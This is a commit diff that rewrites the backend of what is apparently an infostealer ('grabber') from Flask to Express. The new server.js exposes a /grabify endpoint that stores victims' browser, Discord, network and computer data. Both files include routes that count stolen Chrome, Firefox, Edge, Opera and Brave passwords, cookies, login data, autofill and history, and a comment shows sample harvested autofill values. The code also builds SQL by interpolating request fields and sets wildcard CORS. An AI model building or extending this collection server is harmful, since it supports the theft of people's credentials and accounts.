b6db804bb11f9cf5e984e76eccb64c2d2d024dc9
Lukas Olsen <61273323+lukasolsen@users.noreply.github.com>
2023-11-04 15:04:06 +0100

    Changed to express

--- app.py
+++ app.py
@@ -4,9 +4,12 @@ import os
 
 try:
     from flask import Flask, request, abort
+    from flask_cors import CORS, cross_origin
 except:
     pip.main(['install', 'flask'])
+    pip.main(['install', 'flask_cors'])
     from flask import Flask, request, abort
+    from flask_cors import CORS, cross_origin
 
 try:
     import sqlite3
@@ -15,6 +18,15 @@ except:
     import sqlite3
 
 app = Flask(__name__)
+CORS(app, resources={r"/*": {"origins": "http://localhost:5173"}})
+
+# Allow all origins to access the API.
+
+
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    return response
 
 
 @app.route("/grabify", methods=["POST"])
@@ -50,6 +62,8 @@ def webhook():
 @app.route("/get/<user>", methods=["GET"])
 def get(user):
     try:
+        if not os.path.exists("grabber.db"):
+            generate_db()
         if request.method == "GET":
             conn = sqlite3.connect("grabber.db")
             c = conn.cursor()
@@ -74,6 +88,8 @@ def get(user):
 @app.route("/getall", methods=["GET"])
 def getall():
     try:
+        if not os.path.exists("grabber.db"):
+            generate_db()
         if request.method == "GET":
             conn = sqlite3.connect("grabber.db")
             c = conn.cursor()
@@ -94,23 +110,87 @@ def getall():
         abort(404)
 
 
-@app.route("/getall/users", methods=["GET"])
-# Only return the usersnames, not the actual data.
-def getall_users():
+@app.route("/get/<user>/browser", methods=["GET"])
+def getall_user_type(user):
     try:
+        if not os.path.exists("grabber.db"):
+            generate_db()
         if request.method == "GET":
             conn = sqlite3.connect("grabber.db")
             c = conn.cursor()
 
-            data = c.execute("SELECT user FROM grabber").fetchall()
-
+            data = c.execute(
+                "SELECT browser_data FROM grabber WHERE user=?", (user,)).fetchone()
             if data is None:
                 return "User not found."
+
+            # Remove extra characters, such as extra quotes and array brackets
+            # return json.dumps(data[0]).replace("null", "None")
+            decodedJson = json.dumps(data[0])
+
+            parsed_data = json.loads(decodedJson).get("chrome")
+            return parsed_data
+
+            return json.loads(json.dumps(parsed_data)).get("chrome")
+
+            browsers = ["chrome", "firefox", "opera", "edge", "brave"]
+            types = ["Autofill", "History", "Passwords",
+                     "Bookmarks", "Cookies", "LoginData"]
+
+            newData = []
+
+            for browser in browsers:
+                browser_data = parsed_data.get(browser)
+                print(browser_data)
+                data = {}
+                newData.append({
+                    "browser": browser,
+                    "data": data
+                })
+
+                for type in types:
+                    browser_data = browser_data.get(type).get("results")
+                    # This is a list of the results. Load it as json, then count the amount of results.
+                    try:
+                        browser_data = json.loads(browser_data)
+                    except json.JSONDecodeError:
+                        return "Invalid JSON data in the database"
+
+                    data[type] = len(browser_data)
+
+            return newData
+        else:
+            abort(401)
+    except Exception as e:
+        print(e)
+        abort(401)
+
+
+@app.route("/getall/users", methods=["GET"])
+# Only return the usersnames, not the actual data.
+def getall_users():
+    try:
+        if not os.path.exists("grabber.db"):
+            generate_db()
+        if request.method == "GET":
+            conn = sqlite3.connect("grabber.db")
+            c = conn.cursor()
+
+            data = c.execute("SELECT id, user FROM grabber").fetchall()
+
+            if data is None:
+                return "Users not found."
 
             conn.commit()
             conn.close()
 
-            return str(data)
+            # Data is [[1,"LUKAS"]]
+            # We want to return [{
+            #  "id": 1,
+            #   "name": "LUKAS"}]
+
+            return [{"id": x[0], "name": x[1]} for x in data]
+
         else:
             abort(404)
     except Exception as e:
@@ -123,11 +203,13 @@ def generate_db():
     c = conn.cursor()
 
     c.execute("""CREATE TABLE grabber (
+        id integer PRIMARY KEY,
         user text,
         browser_data text,
         discord_data text,
         network_data text,
-        computer_data text
+        computer_data text,
+        custom_data text
     )""")
 
     conn.commit()
---
+++ src/server.js
@@ -0,0 +1,201 @@
+const express = require("express");
+const app = express();
+const db = require("./database.js");
+var cors = require("cors");
+
+const HTTP_PORT = 8080;
+
+app.use(cors());
+app.use(express.json({ limit: "100mb" }));
+
+app.get("/", function (req, res) {
+  res.send({
+    status: "OK",
+    message: "Hello World!",
+  });
+});
+
+app.post("/grabify", function (req, res) {
+  const body = req.body;
+  const dataType = body.dataType; // Update this to 'dataType' if needed
+  const user = body.user;
+  const data_information = body.data;
+
+  // Update SQL database, if the user exists, update the data, if not, create a new entry
+
+  const sql = `SELECT * FROM grabber WHERE user=?`;
+  const params = [user];
+
+  db.get(sql, params, function (err, row) {
+    console.log("Row: ", row);
+    if (err) {
+      res.status(400).json({ error: err.message });
+      return;
+    }
+
+    if (row) {
+      // Update the data
+      const updateSql = `UPDATE grabber SET ${dataType}=? WHERE user=?`;
+      const updateParams = [data_information, user];
+
+      db.run(updateSql, updateParams, function (err, row) {
+        if (err) {
+          res.status(400).json({ error: err.message });
+          return;
+        }
+
+        res.json({
+          message: "success",
+        });
+      });
+    } else {
+      // Create a new entry
+      const insertSql = `INSERT INTO grabber (user, ${dataType}) VALUES (?,?)`;
+      const insertParams = [user, data_information];
+
+      db.run(insertSql, insertParams, function (err, row) {
+        console.log("Insert params: ", row, err);
+        if (err) {
+          res.status(400).json({ error: err.message });
+          return;
+        }
+
+        console.log("New entry created");
+        console.log(row);
+
+        res.json({
+          message: "success",
+          data: data_information, // Use data_information instead of data
+        });
+      });
+    }
+  });
+});
+
+app.get("/getall", function (req, res) {
+  const sql = `SELECT * FROM grabber`;
+  const params = [];
+
+  db.all(sql, params, function (err, rows) {
+    if (err) {
+      res.status(400).json({ error: err.message });
+      return;
+    }
+
+    res.json({
+      message: "success",
+      data: rows,
+    });
+  });
+});
+
+app.get("/get/users", function (req, res) {
+  const sql = `SELECT id, user FROM grabber`;
+  const params = [];
+
+  db.all(sql, params, function (err, rows) {
+    if (err) {
+      res.status(400).json({ error: err.message });
+      return;
+    }
+
+    const users = rows.map((row) => {
+      return {
+        id: row.id,
+        user: row.user,
+      };
+    });
+
+    res.json({
+      message: "success",
+      data: users,
+    });
+  });
+});
+
+app.get("/get/user/:user", function (req, res) {
+  const sql = `SELECT * FROM grabber WHERE user=?`;
+  const params = [req.params.user];
+
+  db.get(sql, params, function (err, row) {
+    if (err) {
+      res.status(400).json({ error: err.message });
+      return;
+    }
+
+    res.json({
+      message: "success",
+      data: row,
+    });
+  });
+});
+
+app.get("/get/user/:user/:dataType", function (req, res) {
+  const sql = `SELECT ${req.params.dataType} FROM grabber WHERE user=?`;
+  const params = [req.params.user];
+
+  db.get(sql, params, function (err, row) {
+    if (err) {
+      res.status(400).json({ error: err.message });
+      return;
+    }
+
+    res.json({
+      message: "success",
+      data: JSON.parse(row[req.params.dataType]), // Update this to 'dataType' if needed
+    });
+  });
+});
+
+// Custom Routes for special data types
+app.get("/get/user/:user/browsers/pre", function (req, res) {
+  const sql = `SELECT browser FROM grabber WHERE user=?`;
+  const params = [req.params.user];
+
+  db.get(sql, params, function (err, row) {
+    if (err) {
+      res.status(400).json({ error: err.message });
+      return;
+    }
+
+    // Example browsers: {"browser":"{\"chrome\": {\"Autofill\": {\"columns\": [\"name\", \"value\", \"value_lower\", \"date_created\", \" ...
+
+    // Return to the user:
+    // {
+    // "chrome": {
+    // Autofill: 32,
+    // Passwords: 12,
+    // ...
+    //}
+    //}
+
+    const browserData = JSON.parse(row.browser);
+    const browserKeys = Object.keys(browserData);
+
+    const browserDataFormatted = browserKeys.map((browserKey) => {
+      const browser = browserData[browserKey];
+      const browserKeys = Object.keys(browser);
+      //{\"columns\": [\"name\", \"value\", \"value_lower\", \"date_created\", \"date_last_used\", \"count\"], \"results\": \"[[\\\"username\\\", \\\"95423035\\\", \\\"95423035\\\", 1698934710, 1698934710, 1], [\\\"edPaHX\\\", \\\"140406 89347\\\", \\\"140406 89347\\\", 1698912633, 1698912633, 1],
+
+      const browserFormatted = browserKeys.map((browserKey) => {
+        console.log(browser);
+        return {
+          [browserKey]: browser[browserKey]?.results?.length || 0,
+        };
+      });
+
+      return {
+        [browserKey]: browserFormatted,
+      };
+    });
+
+    res.json({
+      message: "success",
+      data: browserDataFormatted,
+    });
+  });
+});
+
+app.listen(HTTP_PORT, () => {
+  console.log("Server running on port %PORT%".replace("%PORT%", HTTP_PORT));
+});
